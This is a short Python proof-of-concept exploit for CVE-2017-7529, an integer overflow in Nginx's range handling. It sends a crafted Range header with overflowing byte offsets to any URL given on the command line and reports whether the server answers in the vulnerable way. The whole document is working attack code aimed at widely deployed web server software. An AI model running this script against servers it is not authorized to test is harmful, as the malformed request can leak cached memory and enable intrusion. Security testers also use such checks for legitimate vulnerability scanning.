#!/usr/bin/python
# -*- coding:utf-8 -*-

# Nginx - Remote Integer Overflow Vulnerability
# CVE-2017-7529

import requests
import logging
import sys


logging.basicConfig(level=logging.INFO)
log = logging.getLogger(__name__)


def send_http_request(url, headers={}, timeout=8.0):
    httpResponse   = requests.get(url, headers=headers, timeout=timeout)
    httpHeaders    = httpResponse.headers

    log.info("status: %s: Server: %s", httpResponse.status_code, httpHeaders.get('Server', ''))
    return httpResponse


def exploit(url):
    log.info("target: %s", url)
    httpResponse   = send_http_request(url)

    content_length = httpResponse.headers.get('Content-Length', 0)
    bytes_length   = int(content_length) + 623
    content_length = "bytes=-%d,-9223372036854%d" % (bytes_length, 776000 - bytes_length)

    httpResponse   = send_http_request(url, headers={ 'Range': content_length })
    if httpResponse.status_code == 206 and "Content-Range" in httpResponse.text:
        log.info("[+] Vulnerable to CVE-2017-7529")
    else:
        log.info("[?] Unknown Vulnerable")


if __name__ == '__main__':
    if len(sys.argv) != 2:
        print("[*] %s <url>" % sys.argv[0])
        sys.exit(1)

    url = sys.argv[1]
    exploit(url)
